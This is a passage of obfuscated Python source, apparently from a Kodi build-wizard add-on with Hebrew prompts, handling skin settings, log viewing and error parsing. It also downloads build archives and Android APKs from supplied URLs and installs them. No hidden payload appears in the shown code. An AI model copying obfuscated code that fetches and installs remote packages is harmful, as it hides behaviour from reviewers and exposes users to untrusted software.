			OO00OOOOOOO0OOO0O .write (O000000OO0OO0OO00 .replace ('<setting id="backgroundwallpaper" type="bool%s/setting>'%OOO0OOOO0OOO0OO00 ,'<setting id="backgroundwallpaper" type="bool">true</setting>'))#line:4265
			OO00OOOOOOO0OOO0O .close ()#line:4266
			OO00OO00O0O0OOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4270
			OO00OOOOOOO0OOO0O =open (OO00OO00O0O0OOOOO ,'r')#line:4272
			O000000OO0OO0OO00 =OO00OOOOOOO0OOO0O .read ()#line:4273
			OO00OOOOOOO0OOO0O .close ()#line:4274
			OOO0O0O0OOO00O00O ='<setting id="show.clearlogo" type="bool(.+?)/setting>'#line:4275
			OOO0OOOO0OOO0OO00 =re .compile (OOO0O0O0OOO00O00O ).findall (O000000OO0OO0OO00 )[0 ]#line:4276
			OO00OOOOOOO0OOO0O =open (OO00OO00O0O0OOOOO ,'w')#line:4277
			OO00OOOOOOO0OOO0O .write (O000000OO0OO0OO00 .replace ('<setting id="show.clearlogo" type="bool%s/setting>'%OOO0OOOO0OOO0OO00 ,'<setting id="show.clearlogo" type="bool">false</setting>'))#line:4278
			OO00OOOOOOO0OOO0O .close ()#line:4279
			OO00OO00O0O0OOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4283
			OO00OOOOOOO0OOO0O =open (OO00OO00O0O0OOOOO ,'r')#line:4285
			O000000OO0OO0OO00 =OO00OOOOOOO0OOO0O .read ()#line:4286
			OO00OOOOOOO0OOO0O .close ()#line:4287
			OOO0O0O0OOO00O00O ='<setting id="show.cdart" type="bool(.+?)/setting>'#line:4288
			OOO0OOOO0OOO0OO00 =re .compile (OOO0O0O0OOO00O00O ).findall (O000000OO0OO0OO00 )[0 ]#line:4289
			OO00OOOOOOO0OOO0O =open (OO00OO00O0O0OOOOO ,'w')#line:4290
			OO00OOOOOOO0OOO0O .write (O000000OO0OO0OO00 .replace ('<setting id="show.cdart" type="bool%s/setting>'%OOO0OOOO0OOO0OO00 ,'<setting id="show.cdart" type="bool">false</setting>'))#line:4291
			OO00OOOOOOO0OOO0O .close ()#line:4292
			OO00OO00O0O0OOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4296
			OO00OOOOOOO0OOO0O =open (OO00OO00O0O0OOOOO ,'r')#line:4298
			O000000OO0OO0OO00 =OO00OOOOOOO0OOO0O .read ()#line:4299
			OO00OOOOOOO0OOO0O .close ()#line:4300
			OOO0O0O0OOO00O00O ='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'#line:4301
			OOO0OOOO0OOO0OO00 =re .compile (OOO0O0O0OOO00O00O ).findall (O000000OO0OO0OO00 )[0 ]#line:4302
			OO00OOOOOOO0OOO0O =open (OO00OO00O0O0OOOOO ,'w')#line:4303
			OO00OOOOOOO0OOO0O .write (O000000OO0OO0OO00 .replace ('<setting id="furniture.showhublogo" type="bool%s/setting>'%OOO0OOOO0OOO0OO00 ,'<setting id="furniture.showhublogo" type="bool">false</setting>'))#line:4304
			OO00OOOOOOO0OOO0O .close ()#line:4305
		except :#line:4310
			pass #line:4311
def thirdPartyInstall (O0000OO0000O00OO0 ,OOOO000OO0O0OO00O ):#line:4313
	if not wiz .workingURL (OOOO000OO0O0OO00O ):#line:4314
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4315
	OOOO0OOOOO0OOOOOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0000OO0000O00OO0 ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4316
	if OOOO0OOOOO0OOOOOO ==1 :#line:4317
		freshStart ('third',True )#line:4318
	wiz .clearS ('build')#line:4319
	OOO00OOOOOO00000O =O0000OO0000O00OO0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4320
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4321
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0000OO0000O00OO0 ),'','אנא המתן')#line:4322
	O0O0O0000000OOO0O =os .path .join (PACKAGES ,'%s.zip'%OOO00OOOOOO00000O )#line:4323
	try :os .remove (O0O0O0000000OOO0O )#line:4324
	except :pass #line:4325
	downloader .download (OOOO000OO0O0OO00O ,O0O0O0000000OOO0O ,DP )#line:4326
	xbmc .sleep (1000 )#line:4327
	O0O0OOO0OO0OO000O ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0000OO0000O00OO0 )#line:4328
	DP .update (0 ,O0O0OOO0OO0OO000O ,'','אנא המתן')#line:4329
	O0OO000O0OO0000OO ,OO0O000O00OO00OOO ,OOOOOOO0OO00O00O0 =extract .all (O0O0O0000000OOO0O ,HOME ,DP ,title =O0O0OOO0OO0OO000O )#line:4330
	if int (float (O0OO000O0OO0000OO ))>0 :#line:4331
		wiz .fixmetas ()#line:4332
		wiz .lookandFeelData ('save')#line:4333
		wiz .defaultSkin ()#line:4334
		wiz .setS ('installed','true')#line:4336
		wiz .setS ('extract',str (O0OO000O0OO0000OO ))#line:4337
		wiz .setS ('errors',str (OO0O000O00OO00OOO ))#line:4338
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O0OO000O0OO0000OO ,OO0O000O00OO00OOO ))#line:4339
		try :os .remove (O0O0O0000000OOO0O )#line:4340
		except :pass #line:4341
		if int (float (OO0O000O00OO00OOO ))>0 :#line:4342
			OO0O0000000O0OO00 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0000OO0000O00OO0 ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,O0OO000O0OO0000OO ,'%',COLOR1 ,OO0O000O00OO00OOO ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4343
			if OO0O0000000O0OO00 :#line:4344
				if isinstance (OO0O000O00OO00OOO ,unicode ):#line:4345
					OOOOOOO0OO00O00O0 =OOOOOOO0OO00O00O0 .encode ('utf-8')#line:4346
				wiz .TextBox (ADDONTITLE ,OOOOOOO0OO00O00O0 )#line:4347
	DP .close ()#line:4348
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4349
	if INSTALLMETHOD ==1 :OO0OOO0OO0OO000OO =1 #line:4350
	elif INSTALLMETHOD ==2 :OO0OOO0OO0OO000OO =0 #line:4351
	else :OO0OOO0OO0OO000OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4352
	if OO0OOO0OO0OO000OO ==1 :wiz .reloadFix ()#line:4353
	else :wiz .killxbmc (True )#line:4354
def testTheme (OOO00O0O0OOOOO0O0 ):#line:4356
	O0OO00OOO0O00000O =zipfile .ZipFile (OOO00O0O0OOOOO0O0 )#line:4357
	for OO0000O0O0OOOO0OO in O0OO00OOO0O00000O .infolist ():#line:4358
		if '/settings.xml'in OO0000O0O0OOOO0OO .filename :#line:4359
			return True #line:4360
	return False #line:4361
def testGui (O00000OO000OO0000 ):#line:4363
	O0000O00OO0O0O00O =zipfile .ZipFile (O00000OO000OO0000 )#line:4364
	for O0O00OO0O0O00OO00 in O0000O00OO0O0O00O .infolist ():#line:4365
		if '/guisettings.xml'in O0O00OO0O0O00OO00 .filename :#line:4366
			return True #line:4367
	return False #line:4368
def apkInstaller (O00OOOO000000OO00 ,OO0OO00OO0OOO0000 ):#line:4370
	wiz .log (O00OOOO000000OO00 )#line:4371
	wiz .log (OO0OO00OO0OOO0000 )#line:4372
	if wiz .platform ()=='android':#line:4373
		OOOOO0OOOOO0000O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00OOOO000000OO00 ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4374
		if not OOOOO0OOOOO0000O0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4375
		O0O0OO0O00OO000O0 =O00OOOO000000OO00 #line:4376
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4377
		if not wiz .workingURL (OO0OO00OO0OOO0000 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4378
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O0OO0O00OO000O0 ),'','אנא המתן')#line:4379
		O000000OOOO0O0OO0 =os .path .join (PACKAGES ,"%s.apk"%O00OOOO000000OO00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4380
		try :os .remove (O000000OOOO0O0OO0 )#line:4381
		except :pass #line:4382
		downloader .download (OO0OO00OO0OOO0000 ,O000000OOOO0O0OO0 ,DP )#line:4383
		xbmc .sleep (100 )#line:4384
		DP .close ()#line:4385
		notify .apkInstaller (O00OOOO000000OO00 )#line:4386
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+O000000OOOO0O0OO0 +'")')#line:4387
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4388
def createMenu (OO00OOO0OOO000O00 ,OO0000000000OO0O0 ,OO000O0O0O000O000 ):#line:4394
	if OO00OOO0OOO000O00 =='saveaddon':#line:4395
		OOO00OO00O0OOOOOO =[]#line:4396
		O00O000OOO00OOOO0 =urllib .quote_plus (OO0000000000OO0O0 .lower ().replace (' ',''))#line:4397
		OOO00OOOO00O0O000 =OO0000000000OO0O0 .replace ('Debrid','Real Debrid')#line:4398
		O0OO0OO0000O00O00 =urllib .quote_plus (OO000O0O0O000O000 .lower ().replace (' ',''))#line:4399
		OO000O0O0O000O000 =OO000O0O0O000O000 .replace ('url','URL Resolver')#line:4400
		OOO00OO00O0OOOOOO .append ((THEME2 %OO000O0O0O000O000 .title (),' '))#line:4401
		OOO00OO00O0OOOOOO .append ((THEME3 %'Save %s Data'%OOO00OOOO00O0O000 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O00O000OOO00OOOO0 ,O0OO0OO0000O00O00 )))#line:4402
		OOO00OO00O0OOOOOO .append ((THEME3 %'Restore %s Data'%OOO00OOOO00O0O000 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O00O000OOO00OOOO0 ,O0OO0OO0000O00O00 )))#line:4403
		OOO00OO00O0OOOOOO .append ((THEME3 %'Clear %s Data'%OOO00OOOO00O0O000 ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,O00O000OOO00OOOO0 ,O0OO0OO0000O00O00 )))#line:4404
	elif OO00OOO0OOO000O00 =='save':#line:4405
		OOO00OO00O0OOOOOO =[]#line:4406
		O00O000OOO00OOOO0 =urllib .quote_plus (OO0000000000OO0O0 .lower ().replace (' ',''))#line:4407
		OOO00OOOO00O0O000 =OO0000000000OO0O0 .replace ('Debrid','Real Debrid')#line:4408
		O0OO0OO0000O00O00 =urllib .quote_plus (OO000O0O0O000O000 .lower ().replace (' ',''))#line:4409
		OO000O0O0O000O000 =OO000O0O0O000O000 .replace ('url','URL Resolver')#line:4410
		OOO00OO00O0OOOOOO .append ((THEME2 %OO000O0O0O000O000 .title (),' '))#line:4411
		OOO00OO00O0OOOOOO .append ((THEME3 %'Register %s'%OOO00OOOO00O0O000 ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,O00O000OOO00OOOO0 ,O0OO0OO0000O00O00 )))#line:4412
		OOO00OO00O0OOOOOO .append ((THEME3 %'Save %s Data'%OOO00OOOO00O0O000 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O00O000OOO00OOOO0 ,O0OO0OO0000O00O00 )))#line:4413
		OOO00OO00O0OOOOOO .append ((THEME3 %'Restore %s Data'%OOO00OOOO00O0O000 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O00O000OOO00OOOO0 ,O0OO0OO0000O00O00 )))#line:4414
		OOO00OO00O0OOOOOO .append ((THEME3 %'Import %s Data'%OOO00OOOO00O0O000 ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,O00O000OOO00OOOO0 ,O0OO0OO0000O00O00 )))#line:4415
		OOO00OO00O0OOOOOO .append ((THEME3 %'Clear Addon %s Data'%OOO00OOOO00O0O000 ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,O00O000OOO00OOOO0 ,O0OO0OO0000O00O00 )))#line:4416
	elif OO00OOO0OOO000O00 =='install':#line:4417
		OOO00OO00O0OOOOOO =[]#line:4418
		O0OO0OO0000O00O00 =urllib .quote_plus (OO000O0O0O000O000 )#line:4419
		OOO00OO00O0OOOOOO .append ((THEME2 %OO000O0O0O000O000 ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,O0OO0OO0000O00O00 )))#line:4420
		OOO00OO00O0OOOOOO .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,O0OO0OO0000O00O00 )))#line:4421
		OOO00OO00O0OOOOOO .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,O0OO0OO0000O00O00 )))#line:4422
		OOO00OO00O0OOOOOO .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,O0OO0OO0000O00O00 )))#line:4423
		OOO00OO00O0OOOOOO .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,O0OO0OO0000O00O00 )))#line:4424
	OOO00OO00O0OOOOOO .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4425
	return OOO00OO00O0OOOOOO #line:4426
def toggleCache (O0OO000000000OOOO ):#line:4428
	OO000O0000OO0OO0O =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4429
	OO0O0000OOOO0O0OO =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4430
	if O0OO000000000OOOO in ['true','false']:#line:4431
		for O00O0OO000O0O0O00 in OO000O0000OO0OO0O :#line:4432
			wiz .setS (O00O0OO000O0O0O00 ,O0OO000000000OOOO )#line:4433
	else :#line:4434
		if not O0OO000000000OOOO in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4435
			try :#line:4436
				O00O0OO000O0O0O00 =OO0O0000OOOO0O0OO [OO000O0000OO0OO0O .index (O0OO000000000OOOO )]#line:4437
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,O00O0OO000O0O0O00 ))#line:4438
			except :#line:4439
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,O0OO000000000OOOO ))#line:4440
		else :#line:4441
			OOOOO00OOO0OOO0OO ='true'if wiz .getS (O0OO000000000OOOO )=='false'else 'false'#line:4442
			wiz .setS (O0OO000000000OOOO ,OOOOO00OOO0OOO0OO )#line:4443
def playVideo (OOO0O0OOO000OOO00 ):#line:4445
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%OOO0O0OOO000OOO00 )#line:4446
	if 'watch?v='in OOO0O0OOO000OOO00 :#line:4447
		O00OO00OO0O00OO00 ,OO00OO00000O00000 =OOO0O0OOO000OOO00 .split ('?')#line:4448
		OO0000000O00O00O0 =OO00OO00000O00000 .split ('&')#line:4449
		for OO000O0O0O00O0OO0 in OO0000000O00O00O0 :#line:4450
			if OO000O0O0O00O0OO0 .startswith ('v='):#line:4451
				OOO0O0OOO000OOO00 =OO000O0O0O00O0OO0 [2 :]#line:4452
				break #line:4453
			else :continue #line:4454
	elif 'embed'in OOO0O0OOO000OOO00 or 'youtu.be'in OOO0O0OOO000OOO00 :#line:4455
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%OOO0O0OOO000OOO00 )#line:4456
		O00OO00OO0O00OO00 =OOO0O0OOO000OOO00 .split ('/')#line:4457
		if len (O00OO00OO0O00OO00 [-1 ])>5 :#line:4458
			OOO0O0OOO000OOO00 =O00OO00OO0O00OO00 [-1 ]#line:4459
		elif len (O00OO00OO0O00OO00 [-2 ])>5 :#line:4460
			OOO0O0OOO000OOO00 =O00OO00OO0O00OO00 [-2 ]#line:4461
	wiz .log ("YouTube URL: %s"%OOO0O0OOO000OOO00 )#line:4462
	yt .PlayVideo (OOO0O0OOO000OOO00 )#line:4463
def viewLogFile ():#line:4465
	O0OOOO0OO0O0OO00O =wiz .Grab_Log (True )#line:4466
	OO0O0O0O0000000OO =wiz .Grab_Log (True ,True )#line:4467
	OO0OO00OO00O0OOO0 =0 ;O0O00OO0O00OO0OOO =O0OOOO0OO0O0OO00O #line:4468
	if not OO0O0O0O0000000OO ==False and not O0OOOO0OO0O0OO00O ==False :#line:4469
		OO0OO00OO00O0OOO0 =DIALOG .select (ADDONTITLE ,["View %s"%O0OOOO0OO0O0OO00O .replace (LOG ,""),"View %s"%OO0O0O0O0000000OO .replace (LOG ,"")])#line:4470
		if OO0OO00OO00O0OOO0 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4471
	elif O0OOOO0OO0O0OO00O ==False and OO0O0O0O0000000OO ==False :#line:4472
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4473
		return #line:4474
	elif not O0OOOO0OO0O0OO00O ==False :OO0OO00OO00O0OOO0 =0 #line:4475
	elif not OO0O0O0O0000000OO ==False :OO0OO00OO00O0OOO0 =1 #line:4476
	O0O00OO0O00OO0OOO =O0OOOO0OO0O0OO00O if OO0OO00OO00O0OOO0 ==0 else OO0O0O0O0000000OO #line:4478
	OOO00OO000000O0OO =wiz .Grab_Log (False )if OO0OO00OO00O0OOO0 ==0 else wiz .Grab_Log (False ,True )#line:4479
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,O0O00OO0O00OO0OOO ),OOO00OO000000O0OO )#line:4481
def errorChecking (log =None ,count =None ,all =None ):#line:4483
	if log ==None :#line:4484
		OOO0O0O0O0O00OOO0 =wiz .Grab_Log (True )#line:4485
		OO00O00OO0OOOOO00 =wiz .Grab_Log (True ,True )#line:4486
		if not OO00O00OO0OOOOO00 ==False and not OOO0O0O0O0O00OOO0 ==False :#line:4487
			OO0O0OO00OOO00000 =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(OOO0O0O0O0O00OOO0 .replace (LOG ,""),errorChecking (OOO0O0O0O0O00OOO0 ,True ,True )),"View %s: %s error(s)"%(OO00O00OO0OOOOO00 .replace (LOG ,""),errorChecking (OO00O00OO0OOOOO00 ,True ,True ))])#line:4488
			if OO0O0OO00OOO00000 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4489
		elif OOO0O0O0O0O00OOO0 ==False and OO00O00OO0OOOOO00 ==False :#line:4490
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4491
			return #line:4492
		elif not OOO0O0O0O0O00OOO0 ==False :OO0O0OO00OOO00000 =0 #line:4493
		elif not OO00O00OO0OOOOO00 ==False :OO0O0OO00OOO00000 =1 #line:4494
		log =OOO0O0O0O0O00OOO0 if OO0O0OO00OOO00000 ==0 else OO00O00OO0OOOOO00 #line:4495
	if log ==False :#line:4496
		if count ==None :#line:4497
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4498
			return False #line:4499
		else :#line:4500
			return 0 #line:4501
	else :#line:4502
		if os .path .exists (log ):#line:4503
			OO00O00OO000O000O =open (log ,mode ='r');O0OO000OO0O0OO0O0 =OO00O00OO000O000O .read ().replace ('\n','').replace ('\r','');OO00O00OO000O000O .close ()#line:4504
			O0O00000OOOO0000O =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (O0OO000OO0O0OO0O0 )#line:4505
			if not count ==None :#line:4506
				if all ==None :#line:4507
					OOO0O0OOO0O0OOO0O =0 #line:4508
					for OOO0O00OOO00O000O in O0O00000OOOO0000O :#line:4509
						if ADDON_ID in OOO0O00OOO00O000O :OOO0O0OOO0O0OOO0O +=1 #line:4510
					return OOO0O0OOO0O0OOO0O #line:4511
				else :return len (O0O00000OOOO0000O )#line:4512
			if len (O0O00000OOOO0000O )>0 :#line:4513
				OOO0O0OOO0O0OOO0O =0 ;O00OO00000O00O0OO =""#line:4514
				for OOO0O00OOO00O000O in O0O00000OOOO0000O :#line:4515
					if all ==None and not ADDON_ID in OOO0O00OOO00O000O :continue #line:4516
					else :#line:4517
						OOO0O0OOO0O0OOO0O +=1 #line:4518
						O00OO00000O00O0OO +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(OOO0O0OOO0O0OOO0O ,OOO0O00OOO00O000O .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4519
				if OOO0O0OOO0O0OOO0O >0 :#line:4520
					wiz .TextBox (ADDONTITLE ,O00OO00000O00O0OO )#line:4521
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4522
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4523
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4524
ACTION_PREVIOUS_MENU =10 #line:4526
ACTION_NAV_BACK =92 #line:4527
ACTION_MOVE_LEFT =1 #line:4528
ACTION_MOVE_RIGHT =2 #line:4529
ACTION_MOVE_UP =3 #line:4530
ACTION_MOVE_DOWN =4 #line:4531
ACTION_MOUSE_WHEEL_UP =104 #line:4532
ACTION_MOUSE_WHEEL_DOWN =105 #line:4533
ACTION_MOVE_MOUSE =107 #line:4534
ACTION_SELECT_ITEM =7 #line:4535
ACTION_BACKSPACE =110 #line:4536
ACTION_MOUSE_LEFT_CLICK =100 #line:4537
ACTION_MOUSE_LONG_CLICK =108 #line:4538
def LogViewer (default =None ):#line:4540
	class O0000000O00O000OO (xbmcgui .WindowXMLDialog ):#line:4541
		def __init__ (O0000OO00O00O00OO ,*OO0O0OO0O0O0000O0 ,**OO0O000OO0OOOOOO0 ):#line:4542
			O0000OO00O00O00OO .default =OO0O000OO0OOOOOO0 ['default']#line:4543
		def onInit (O0000000O0OO0OOO0 ):#line:4545
			O0000000O0OO0OOO0 .title =101 #line:4546
			O0000000O0OO0OOO0 .msg =102 #line:4547
			O0000000O0OO0OOO0 .scrollbar =103 #line:4548
			O0000000O0OO0OOO0 .upload =201 #line:4549
			O0000000O0OO0OOO0 .kodi =202 #line:4550
			O0000000O0OO0OOO0 .kodiold =203 #line:4551
			O0000000O0OO0OOO0 .wizard =204 #line:4552
			O0000000O0OO0OOO0 .okbutton =205 #line:4553
			OO0O0O0000O000O00 =open (O0000000O0OO0OOO0 .default ,'r')#line:4554
			O0000000O0OO0OOO0 .logmsg =OO0O0O0000O000O00 .read ()#line:4555
			OO0O0O0000O000O00 .close ()#line:4556
			O0000000O0OO0OOO0 .titlemsg ="%s: %s"%(ADDONTITLE ,O0000000O0OO0OOO0 .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4557
			O0000000O0OO0OOO0 .showdialog ()#line:4558
		def showdialog (OOOO00O000000O0O0 ):#line:4560
			OOOO00O000000O0O0 .getControl (OOOO00O000000O0O0 .title ).setLabel (OOOO00O000000O0O0 .titlemsg )#line:4561
			OOOO00O000000O0O0 .getControl (OOOO00O000000O0O0 .msg ).setText (wiz .highlightText (OOOO00O000000O0O0 .logmsg ))#line:4562
			OOOO00O000000O0O0 .setFocusId (OOOO00O000000O0O0 .scrollbar )#line:4563
		def onClick (OOO0OO000O0OO0O0O ,O00O00O0O000OOO0O ):#line:4565
			if O00O00O0O000OOO0O ==OOO0OO000O0OO0O0O .okbutton :OOO0OO000O0OO0O0O .close ()#line:4566
			elif O00O00O0O000OOO0O ==OOO0OO000O0OO0O0O .upload :OOO0OO000O0OO0O0O .close ();uploadLog .Main ()#line:4567
			elif O00O00O0O000OOO0O ==OOO0OO000O0OO0O0O .kodi :#line:4568
				OO0OO000O0000OO0O =wiz .Grab_Log (False )#line:4569
				OO00000O000O0O0OO =wiz .Grab_Log (True )#line:4570
				if OO0OO000O0000OO0O ==False :#line:4571
					OOO0OO000O0OO0O0O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4572
					OOO0OO000O0OO0O0O .getControl (OOO0OO000O0OO0O0O .msg ).setText ("Log File Does Not Exists!")#line:4573
				else :#line:4574
					OOO0OO000O0OO0O0O .titlemsg ="%s: %s"%(ADDONTITLE ,OO00000O000O0O0OO .replace (LOG ,''))#line:4575
					OOO0OO000O0OO0O0O .getControl (OOO0OO000O0OO0O0O .title ).setLabel (OOO0OO000O0OO0O0O .titlemsg )#line:4576
					OOO0OO000O0OO0O0O .getControl (OOO0OO000O0OO0O0O .msg ).setText (wiz .highlightText (OO0OO000O0000OO0O ))#line:4577
					OOO0OO000O0OO0O0O .setFocusId (OOO0OO000O0OO0O0O .scrollbar )#line:4578
			elif O00O00O0O000OOO0O ==OOO0OO000O0OO0O0O .kodiold :#line:4579
				OO0OO000O0000OO0O =wiz .Grab_Log (False ,True )#line:4580
				OO00000O000O0O0OO =wiz .Grab_Log (True ,True )#line:4581
				if OO0OO000O0000OO0O ==False :#line:4582
					OOO0OO000O0OO0O0O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4583
					OOO0OO000O0OO0O0O .getControl (OOO0OO000O0OO0O0O .msg ).setText ("Log File Does Not Exists!")#line:4584
				else :#line:4585
					OOO0OO000O0OO0O0O .titlemsg ="%s: %s"%(ADDONTITLE ,OO00000O000O0O0OO .replace (LOG ,''))#line:4586
					OOO0OO000O0OO0O0O .getControl (OOO0OO000O0OO0O0O .title ).setLabel (OOO0OO000O0OO0O0O .titlemsg )#line:4587
					OOO0OO000O0OO0O0O .getControl (OOO0OO000O0OO0O0O .msg ).setText (wiz .highlightText (OO0OO000O0000OO0O ))#line:4588
					OOO0OO000O0OO0O0O .setFocusId (OOO0OO000O0OO0O0O .scrollbar )#line:4589
			elif O00O00O0O000OOO0O ==OOO0OO000O0OO0O0O .wizard :#line:4590
				OO0OO000O0000OO0O =wiz .Grab_Log (False ,False ,True )#line:4591
				OO00000O000O0O0OO =wiz .Grab_Log (True ,False ,True )#line:4592
				if OO0OO000O0000OO0O ==False :#line:4593
					OOO0OO000O0OO0O0O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4594
					OOO0OO000O0OO0O0O .getControl (OOO0OO000O0OO0O0O .msg ).setText ("Log File Does Not Exists!")#line:4595
				else :#line:4596
					OOO0OO000O0OO0O0O .titlemsg ="%s: %s"%(ADDONTITLE ,OO00000O000O0O0OO .replace (ADDONDATA ,''))#line:4597
					OOO0OO000O0OO0O0O .getControl (OOO0OO000O0OO0O0O .title ).setLabel (OOO0OO000O0OO0O0O .titlemsg )#line:4598
					OOO0OO000O0OO0O0O .getControl (OOO0OO000O0OO0O0O .msg ).setText (wiz .highlightText (OO0OO000O0000OO0O ))#line:4599
					OOO0OO000O0OO0O0O .setFocusId (OOO0OO000O0OO0O0O .scrollbar )#line:4600
